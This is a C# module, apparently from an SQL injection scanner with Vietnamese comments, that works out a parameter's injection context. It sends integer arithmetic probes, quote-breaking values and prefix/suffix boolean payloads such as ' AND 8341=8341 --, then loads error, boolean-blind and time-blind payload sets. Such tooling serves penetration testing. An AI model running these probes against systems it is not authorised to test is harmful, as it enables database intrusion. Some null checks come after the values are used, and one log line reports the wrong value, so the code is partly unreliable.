using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using SQLiScanner.Models;
using SQLiScanner.Utilities;
using SQLiScanner.Utility;

namespace SQLiScanner.Modules
{
    public class ContextAnalyzer
    {
        private readonly HttpClient _client;
        private readonly string _boundariesXmlPath;
        private readonly string _errorBasedXmlPath;
        private readonly string _booleanBlindXmlPath;
        private readonly string _timeBlindXmlPath;

        public const string INT_PAYLOAD_1 = "1";
        public const string INT_PAYLOAD_2 = "1-1";
        public const string INT_PAYLOAD_3 = "2-1";

        public ContextAnalyzer(
            HttpClient httpClient)
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;

            _client = httpClient;
            _boundariesXmlPath = Path.Combine(baseDir, "Resources", "boundaries.xml");
            _errorBasedXmlPath = Path.Combine(baseDir, "Resources", "Payloads", "error_based.xml");
            _booleanBlindXmlPath = Path.Combine(baseDir, "Resources", "Payloads", "boolean_blind.xml");
            _timeBlindXmlPath = Path.Combine(baseDir, "Resources", "Payloads", "time_blind.xml");
        }

        public async Task<HeuristicResult> PerformHeuristicScanAsync(CrawlResult target, string paramName)
        {
            string originalValue = target.Params[paramName];
            var result = new HeuristicResult();

            try
            {
                var (baseHtml, baseBytes, baseStatus) = await SendPayloadAsync(target, paramName, originalValue);
                if (baseBytes == null)
                {
                    result.Status = "FAILED";
                    Logger.Warning("Không lấy được Baseline. Target có thể đã sập hoặc WAF chặn.");
                    return result; // Thoát sớm, an toàn tuyệt đối
                }

                Logger.Phase($"XÁC ĐỊNH NGỮ CẢNH CỦA {target.FullUrl} (Tham số: {paramName})");
                Logger.Info("Kiểm tra ngữ cảnh integer...");

                // PHASE 1: Kiểm tra ngữ cảnh là INTEGER
                await Phase1_DetectIntegerContextAsync(target, paramName, result);

                if (result.DetectedType != "INTEGER")
                {
                    Logger.Phase("[PHASE 2] KIỂM TRA NGỮ CẢNH STRING THÔNG QUA ERROR-BASED");

                    // PHASE 2: Kiểm tra liệu ngữ cảnh có phải là string-like
                    await Phase2_DetectStringContextAsync(
                        target, paramName, originalValue, baseStatus,
                        baseBytes.Length, baseHtml, result
                    );
                }


                if (result.ApplicableBoundaries.Count > 0)
                {
                    Logger.Phase("[PHASE 3] XÁC ĐỊNH CHÍNH XÁC BOUNDARY");
                    // PHASE 3: Xác định ngữ cảnh
                    await Phase3_VerifyBoundaryAsync(
                        target, paramName, originalValue, baseStatus,
                        baseBytes.Length, baseHtml, result
                    );
                }

                if (!result.IsReadyForDetection)
                {
                    Logger.Warning($"Không tìm được boundary bằng Heuritic. Buộc load hết toàn bộ boundaries và Payload");
                    result.Status = "UNCERTAIN";
                    result.ApplicableBoundaries = await GetAllApplicableBoundaries();
                    await LoadApplicablePayloadsAsync(result);
                }

                return result;
            }
            catch (Exception ex)
            {
                // Nếu xảy ra lỗi thì load toàn bộ boundary và payload
                Logger.Error($"Lỗi nghiêm trọng tại ContextAnalyzer: {ex.Message}");
                result.Status = "FAILED"; // Đánh dấu thất bại hoàn toàn

                result.ApplicableBoundaries = await GetAllApplicableBoundaries();
                await LoadApplicablePayloadsAsync(result);
                return result;
            }
        }

        private async Task<List<Boundary>> GetBoundariesByPType(int ptype)
        {
            Logger.Process($"Load các boundary với ptype = {ptype}");

            try
            {
                var allBoundaries = await PayloadLoader.LoadBoundariesAsync(_boundariesXmlPath);

                var filtered = allBoundaries
                    .Where(b => b.PType == ptype)
                    .OrderBy(b => b.Level) // Sắp xếp theo Level
                    .ToList();

                return filtered;
            }
            catch
            {
                // Lấy Boundary cứng nếu như load fail
                return GetHardcodedBoundaries(ptype);
            }
        }

        private List<Boundary> GetHardcodedBoundaries(int ptype)
        {
            return ptype switch
            {
                1 => new() // INTEGER
                {
                    new Boundary
                    {
                        Level = 1,
                        Clause = "1",
                        Where = "1",
                        PType = 1,
                        Prefix = "",
                        Suffix = "",
                        ContextName = "INTEGER"
                    }
                },

                2 => new() // STRING_SINGLE_QUOTE
                {
                    new Boundary
                    {
                        Level = 1,
                        Clause = "1",
                        Where = "1",
                        PType = 2,
                        Prefix = "'",
                        Suffix = "--",
                        ContextName = "STRING_SINGLE_QUOTE"
                    },
                    new Boundary
                    {
                        Level = 1,
                        Clause = "1",
                        Where = "1",
                        PType = 2,
                        Prefix = "'",
                        Suffix = "AND '1'='1",
                        ContextName = "STRING_SINGLE_QUOTE_AND"
                    }
                },

                3 => new() // LIKE_SINGLE_QUOTE
                {
                    new Boundary
                    {
                        Level = 2,
                        Clause = "1",
                        Where = "1",
                        PType = 3,
                        Prefix = "%'",
                        Suffix = "AND '%'='",
                        ContextName = "LIKE_SINGLE_QUOTE"
                    }
                },

                _ => new() // Default: Empty
            };
        }

        private List<Boundary> GetNestedParenthesisBoundaries()
        {
            return new()
            {
                new Boundary
                {
                    Level = 2,
                    Clause = "1",
                    Where = "1",
                    PType = 1, // Coi như numeric
                    Prefix = "')",
                    Suffix = "AND ('1'='1",
                    ContextName = "NESTED_PARENTHESIS"
                },
                new Boundary
                {
                    Level = 2,
                    Clause = "1",
                    Where = "1",
                    PType = 1,
                    Prefix = "')",
                    Suffix = "--",
                    ContextName = "NESTED_PARENTHESIS_COMMENT"
                }
            };
        }

        public async Task<List<PayloadTest>> LoadApplicablePayloads(int stype = 0)
        {
            var allPayloads = new List<PayloadTest>();

            try
            {
                // Load error-based payloads
                if (stype == 0 || stype == 2)
                    allPayloads.AddRange(await PayloadLoader.LoadPayloadAsync(_errorBasedXmlPath, 2));

                // Load boolean-based payloads
                if (stype == 0 || stype == 1)
                    allPayloads.AddRange(await PayloadLoader.LoadPayloadAsync(_booleanBlindXmlPath, 1));

                // Load time-based payloads
                if (stype == 0 || stype == 5)
                    allPayloads.AddRange(await PayloadLoader.LoadPayloadAsync(_timeBlindXmlPath, 5));

                return allPayloads.ToList();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Warning] Không thể load payloads: {ex.Message}");
                return new List<PayloadTest>();
            }
        }

        private async Task<(string html, byte[] bytes, int statusCode)> SendPayloadAsync(
            CrawlResult target, string paramName, string payloadValue)
        {
            try
            {
                Dictionary<string, string> checkParams = new Dictionary<string, string>(target.Params);
                checkParams[paramName] = payloadValue;
                var method = new HttpMethod(target.HttpMethod.ToUpper());
                HttpRequestMessage request;

                if (method == HttpMethod.Get)
                {
                    var uriBuilder = new UriBuilder(target.FullUrl);
                    var query = System.Web.HttpUtility.ParseQueryString(string.Empty);
                    foreach (var p in checkParams) query[p.Key] = p.Value;
                    uriBuilder.Query = query.ToString();

                    request = new HttpRequestMessage(method, uriBuilder.ToString());
                    Logger.Request(method.ToString(), request.RequestUri.ToString());
                }
                else // POST
                {
                    request = new HttpRequestMessage(method, target.FullUrl);
                    request.Content = new FormUrlEncodedContent(checkParams);
                    Logger.Process($"[>] Đang gửi Form cùng các truòng dữ liệu đính kèm...");
                    Logger.Request(method.ToString(), string.Join(", ", checkParams.Select(kv => $"{kv.Key} = [{kv.Value}]")));
                }

                if (!request.Headers.Contains("User-Agent"))
                {
                    request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                }

                using var response = await _client.SendAsync(request, HttpCompletionOption.ResponseContentRead);
                var bytes = await response.Content.ReadAsByteArrayAsync();
                var charset = response.Content.Headers.ContentType?.CharSet;
                var encoding = charset is not null ? Encoding.GetEncoding(charset) : Encoding.UTF8;

                return (encoding.GetString(bytes), bytes, (int)response.StatusCode);
            }
            catch (Exception ex)
            {
                Logger.Error($"Gửi Request thất bại: {ex.Message}");
                return (null, null, 0);
            }
        }

        #region Các hàm phụ trợ
        private async Task Phase1_DetectIntegerContextAsync(CrawlResult target, string paramName, HeuristicResult result)
        {
            Logger.Info("KỲ VỌNG: Các tham số với payload là các toán tử, nếu như tham số là INTEGER thì các phép toán này sẽ hoạt động.");
            // Lấy base response
            Logger.Process("Kiểm tra tham số với giá trị = 1");
            var (baselineHtml, baselineBytes, baselineStatus) =
                await SendPayloadAsync(target, paramName, INT_PAYLOAD_1);
            Logger.Response(baselineStatus, baselineBytes.Length);
            if (baselineBytes == null)
            {
                result.DetectedType = "UNKNOWN";
                result.ConfidenceScore = 0;
                return;
            }

            int baselineLength = baselineBytes.Length;

            // Test payloa False
            Logger.Process("Kiểm tra tham số với giá trị = 1-1");
            var (falseHtml, falseBytes, flaseStatus) =
                await SendPayloadAsync(target, paramName, INT_PAYLOAD_2);
            Logger.Response(flaseStatus, falseBytes.Length);

            if (falseBytes == null)
            {
                result.DetectedType = "UNKNOWN";
                result.ConfidenceScore = 0;
                Logger.Warning("Không nhận được phản hồi từ đối tượng. Kiểm tra Phase 1 thất bại!");
                return;
            }

            // Test payload 3
            Logger.Process("Kiểm tra tham số với giá trị = 2-1");
            var (trueHtml, trueBytes, trueStatus) =
                await SendPayloadAsync(target, paramName, INT_PAYLOAD_3);

            Logger.Response(trueStatus, trueBytes.Length);
            if (trueBytes == null)
            {
                result.DetectedType = "UNKNOWN";
                result.ConfidenceScore = 0;
                return;
            }

            Logger.Info("Đang mong chờ phản hồi có payload (2-1) sẽ giống (1) và ngược lại đối với (1-1) sẽ không giống (1)");
            // Nếu cả base và payload 2 và 3 đều giống nhau thì tham số là Integer
            double similarityPayloadFalse = CalculateSimilarity(
                baselineStatus, baselineLength, baselineHtml,
                flaseStatus, falseBytes.Length, falseHtml);
            Logger.Info($"Payload (1-1) giống {(similarityPayloadFalse * 100):F1}% so với Payload (1)");

            double similarityPayloadTrue = CalculateSimilarity(
                baselineStatus, baselineLength, baselineHtml,
                trueStatus, trueBytes.Length, trueHtml
            );
            Logger.Info($"Payload (2-1) giống {similarityPayloadFalse * 100}% so với Payload (1)");

            result.Similarity = Math.Max(similarityPayloadFalse, similarityPayloadTrue);

            // Ngưỡng mức chấp nhận cho Integer (> 95% -> Integer)
            const double INTEGER_THRESHOLD = 0.95;
            Logger.Process($"Đặt ngưỡng mức trùng nhau là {INTEGER_THRESHOLD * 100}%, sai số {((1.0 - INTEGER_THRESHOLD) * 100):F1}%");
            // Nếu payload 2 - 1 (giống base = 1) trả về như base thì chắc chắn server thực hiện phép trừ và có thể kết luận ngữ cảnh là Integer
            if (similarityPayloadTrue > INTEGER_THRESHOLD && similarityPayloadFalse < INTEGER_THRESHOLD)
            {
                result.DetectedType = "INTEGER";
                result.ConfidenceScore = (int)Math.Min(100, (result.Similarity * 100));
                Logger.Success("Phát hiện payload (2-1) trùng với payload (1) như dự đoán.");
                Logger.Success($"THÀNH CÔNG PHÁT HIỆN: INTEGER (ĐIỂM: {result.ConfidenceScore}%)");
                Logger.Info("Cần phải trải qua PHASE 3 để xác định BOUNDARY CHÍNH XÁC.");
                result.ApplicableBoundaries = await GetBoundariesByPType(1);
                return;
            }

            result.DetectedType = "UNCERTAIN";
            result.ConfidenceScore = 0;

            Logger.Warning($"Payload True (2-1) và Payload False (1-1) đều không ra như kết quả dự đoán.");
            Logger.Warning("Không thể là INTEGER - Chuyển sang kiểm tra ngữ cảnh STRING-LIKE ở Phase 2");
            return;
        }

        private async Task Phase2_DetectStringContextAsync(
            CrawlResult target,
            string paramName,
            string originalValue,
            int baselineStatus,
            int baselineLength,
            string baselineHtml,
            HeuristicResult result)
        {
            Logger.Info("KỲ VỌNG: Cố tình chèn các Prefix gây lỗi, nếu như đúng là ngữ cảnh STRING thì sẽ báo về lỗi");
            const double STRING_LIKE_THRESHOLD = 0.90;
            Logger.Process($"Đặt ngưỡng mức trùng nhau là {STRING_LIKE_THRESHOLD * 100}%, sai số {((1.0 - STRING_LIKE_THRESHOLD) * 100):F1}%");
            var testPayloads = new[]
            {
                $"{originalValue}'",    // Single quote
                $"{originalValue}\"",   // Double quote
                $"{originalValue}%'",    // LIKE pattern single
                $"{originalValue}%\"",   // LIKE pattern double
                $"{originalValue}')"     // Nested parenthesis
            };

            foreach (var payload in testPayloads)
            {
                Logger.Process($"Chèn payload [{payload}]");
                var (testHtml, testBytes, testStatus) =
                    await SendPayloadAsync(target, paramName, payload);
                Logger.Response(testStatus, testBytes.Length);

                if (testBytes == null)
                {
                    Logger.Skipped("Không nhận được phản hồi từ đối tượng. Chuyển sang Payload khác!");
                    continue;
                }

                double similarity = CalculateSimilarity(
                    baselineStatus, baselineLength, baselineHtml,
                    testStatus, testBytes.Length, testHtml
                );
                Logger.Info($"Payload [{payload}] giống {similarity * 100}% so request nguyên bản");

                if (similarity < STRING_LIKE_THRESHOLD)
                {
                    result.DetectedType = "STRING_LIKE";
                    result.ConfidenceScore = (int)((1.0 - similarity) * 100);
                    result.Similarity = similarity * 100;

                    result.ApplicableBoundaries = await GetAllStringLikeBoundaries();

                    Logger.Success($"PHÁT HIỆN PAYLOAD [{payload}] GÂY LỖI, CHẮC CHẮN LÀ STRING-LIKE - ĐIỂM: {result.ConfidenceScore}%");
                    return;
                }
            }

            result.DetectedType = "UNCERTAIN";
            result.ConfidenceScore = 0;
            result.Similarity = 100;
            result.ApplicableBoundaries = await GetAllApplicableBoundaries();

            Logger.Warning("Không tìm thấy dấu hiệu là string - Cần phải kiểm tra toàn bộ boundary ở Phase 3");

            return;
        }

        private async Task Phase3_VerifyBoundaryAsync(
            CrawlResult target,
            string paramName,
            string originalValue,
            int baselineStatus,
            int baselineLength,
            string baselineHtml,
            HeuristicResult result)
        {
            Logger.Info("KỲ VỌNG: Xác định chính xác boundary thông qua thử từng boundary bằng BOOLEAN LOGIC.");
            Logger.Info("Sử dụng 2 payload True (8341=8341) và False (8341=8342) để kiểm tra");

            const double SIMILARITY_THRESHOLD = 0.95;
            foreach (var boundary in result.ApplicableBoundaries)
            {
                Logger.Process($"Sử dụng Boundary: {boundary}");
                string trueCondition = "8341=8341";
                string falseCondition = "8341=8342";

                Logger.Process($"Thiết lặp True Payload (Prefix: [{boundary.Prefix}] | Suffix: [{boundary.Suffix}])");
                string truePayload = $"{originalValue}{boundary.Prefix} AND {trueCondition} {boundary.Suffix} ";
                Logger.Process($"Thiết lặp False Payload (Prefix: [{boundary.Prefix}] | Suffix: [{boundary.Suffix}])");
                string falsePayload = $"{originalValue}{boundary.Prefix} AND {falseCondition} {boundary.Suffix} ";

                // TEST FALSE PAYLOAD (Kỳ vọng: Khác Base)
                Logger.Process("Gửi False Payload...");
                var (htmlFalse, bytesFalse, statusFalse) = await SendPayloadAsync(target, paramName, falsePayload);
                Logger.Response(statusFalse, bytesFalse.Length);

                if (bytesFalse == null)
                {
                    Logger.Warning("Không nhận được phản hồi từ đối tượng. Chuyển sang boundary tiếp theo!");
                    continue;
                }

                double simFalse = CalculateSimilarity(
                    baselineStatus, baselineLength, baselineHtml,
                    statusFalse, bytesFalse.Length, htmlFalse);
                Logger.Info($"Payload False giống {(simFalse * 100):F1}% so request nguyên bản");

                // TEST TRUE PAYLOAD (Kỳ vọng: Giống Base)
                Logger.Process("Gửi True Payload...");
                var (htmlTrue, bytesTrue, statusTrue) = await SendPayloadAsync(target, paramName, truePayload);
                Logger.Response(statusTrue, bytesTrue.Length);

                if (bytesTrue == null)
                {
                    Logger.Warning("Không nhận được phản hồi từ đối tượng. Chuyển sang boundary tiếp theo!");
                    continue;
                }

                double simTrue = CalculateSimilarity(
                    baselineStatus, baselineLength, baselineHtml,
                    statusTrue, bytesTrue.Length, htmlTrue);
                Logger.Info($"Payload True giống {simTrue * 100}% so request nguyên bản");

                // Kịch bản 1: True giống Base, False khác Base
                bool isRegularMatch = simTrue >= SIMILARITY_THRESHOLD && simFalse < SIMILARITY_THRESHOLD;
                if (isRegularMatch) Logger.Success("Phát hiện: True giống Base, False khác Base (Đúng như dự đoán)");

                // Kịch bản 2: False giống Base, True khác Base (Trường hợp Bypass / Original Value là sai)
                bool isInverseMatch = simFalse >= SIMILARITY_THRESHOLD && simTrue < SIMILARITY_THRESHOLD;
                if (isInverseMatch) Logger.Success("Phát hiện: False giống Base, True khác Base (Trường hợp Bypass / Original Value là sai)");

                // Bổ sung: Đảm bảo độ chênh lệch giữa True và False phải đủ lớn (ví dụ > 5%) để tránh nhiễu
                bool hasSignificantDifference = Math.Abs(simTrue - simFalse) >= 0.05;

                if ((isRegularMatch || isInverseMatch) && hasSignificantDifference)
                {
                    Logger.Success($"✓ Boundary Worked: {boundary.ContextName}");
                    result.LockedBoundary = boundary;
                    result.ApplicableBoundaries.Clear();
                    result.ApplicableBoundaries.Add(boundary);
                    result.Status = "SUCCESS";

                    // Load payloads
                    await LoadApplicablePayloadsAsync(result);

                    return;
                }

                Logger.Warning($"Boundary {boundary} không có tác dụng.");
            }

            result.Status = "UNCERTAIN";
        }

        private async Task<List<Boundary>> GetAllStringLikeBoundaries()
        {
            try
            {
                var allBoundaries = await PayloadLoader.LoadBoundariesAsync(_boundariesXmlPath);

                // Filter: Chỉ lấy string-like contexts
                var stringLikeBoundaries = allBoundaries
                    .Where(b => b.PType == 2 || b.PType == 3 || b.PType == 4 || b.PType == 5)  // Single quote, Single quote LIKE, double quote, Double quote LIKE
                    .ToList();

                // Lấy Nested context
                stringLikeBoundaries.AddRange(GetNestedParenthesisBoundaries());

                return stringLikeBoundaries
                    .OrderBy(b => b.Level)
                    .ThenBy(b => b.Clause)
                    .ToList();
            }
            catch
            {
                // Fallback
                var boundaries = new List<Boundary>();
                boundaries.AddRange(await GetBoundariesByPType(2));    // Single quote
                boundaries.AddRange(await GetBoundariesByPType(3));    // LIKE
                boundaries.AddRange(GetNestedParenthesisBoundaries()); // Nested
                return boundaries;
            }
        }

        private async Task LoadApplicablePayloadsAsync(HeuristicResult result)
        {
            try
            {
                // Load tất cả 3 loại payloads
                var errorPayloads = await PayloadLoader.LoadPayloadAsync(_errorBasedXmlPath, 2);
                var booleanPayloads = await PayloadLoader.LoadPayloadAsync(_booleanBlindXmlPath, 1);
                var timePayloads = await PayloadLoader.LoadPayloadAsync(_timeBlindXmlPath, 5);

                // Merge
                var allPayloads = new List<PayloadTest>();
                allPayloads.AddRange(errorPayloads);
                allPayloads.AddRange(booleanPayloads);
                allPayloads.AddRange(timePayloads);

                // Sort: Level (easy → hard) then Risk (low → high)
                result.ApplicablePayloads = allPayloads
                    .OrderBy(p => p.Level)
                    .ThenBy(p => p.Risk)
                    .ToList();

                Logger.Info($"Loaded {result.ApplicablePayloads.Count} payloads từ XML");
            }
            catch (Exception ex)
            {
                Logger.Warning($"Lỗi load payloads: {ex.Message}");
            }
        }
        private async Task<List<Boundary>> GetAllApplicableBoundaries()
        {
            try
            {
                return await PayloadLoader.LoadBoundariesAsync(_boundariesXmlPath);
            }
            catch
            {
                var all = new List<Boundary>();
                all.AddRange(await GetBoundariesByPType(1));
                all.AddRange(await GetBoundariesByPType(2));
                all.AddRange(await GetBoundariesByPType(3));
                return all;
            }
        }

        private double CalculateSimilarity(
            int status1, int length1, string html1,
            int status2, int length2, string html2,
            double tolerancePercent = 0.05)
        {
            // Lọc status code
            if (status1 != status2)
            {
                return 0.0;
            }

            // Lọc Content-Length
            if (length1 == length2 && html1 == html2)
                return 1.0;

            int maxLength = Math.Max(length1, length2);
            if (maxLength > 0)
            {
                double diffRatio = (double)Math.Abs(length1 - length2) / maxLength;

                if (diffRatio > tolerancePercent)
                {
                    return 0.0;
                }
            }

            // Lọc nội dung của Response
            string text1 = ExtractPlainText(html1);
            string text2 = ExtractPlainText(html2);

            return CalculateContentSimilarity(text1, text2);
        }

        private double CalculateContentSimilarity(string text1, string text2)
        {
            if (string.IsNullOrEmpty(text1) && string.IsNullOrEmpty(text2)) return 1.0;
            if (string.IsNullOrEmpty(text1) || string.IsNullOrEmpty(text2)) return 0.0;
            if (text1 == text2) return 1.0;
            char[] separator = new[] { ' ' };

            var set1 = new HashSet<string>(text1.Split(separator, StringSplitOptions.RemoveEmptyEntries));
            var set2 = new HashSet<string>(text2.Split(separator, StringSplitOptions.RemoveEmptyEntries));

            int intersectionCount = set1.Intersect(set2).Count();
            int unionCount = set1.Union(set2).Count();

            if (unionCount == 0) return 0.0;

            return (double)intersectionCount / unionCount;
        }

        private string ExtractPlainText(string html)
        {
            if (string.IsNullOrWhiteSpace(html)) return string.Empty;

            // Xóa toàn bộ nội dung trong thẻ script và style
            string result = Regex.Replace(html, @"<script[^>]*>[\s\S]*?</script>", string.Empty, RegexOptions.IgnoreCase);
            result = Regex.Replace(result, @"<style[^>]*>[\s\S]*?</style>", string.Empty, RegexOptions.IgnoreCase);

            // Xóa các comment
            result = Regex.Replace(result, @"<!--[\s\S]*?-->", string.Empty);

            // Xóa tát cả thẻ HTML (<div>, <a>, <img>)
            result = Regex.Replace(result, @"<[^>]+>", " ");

            // Giải mã các kí tự html (&nbsp, &amp, &lt) thành kí tự thật
            result = WebUtility.HtmlDecode(result);

            // Format lại các khoảng trắng/dòng thừa thành 1 khoảng trắng duy nhất
            result = Regex.Replace(result, @"\s+", " ").Trim();

            return result;
        }
        #endregion

    }
}
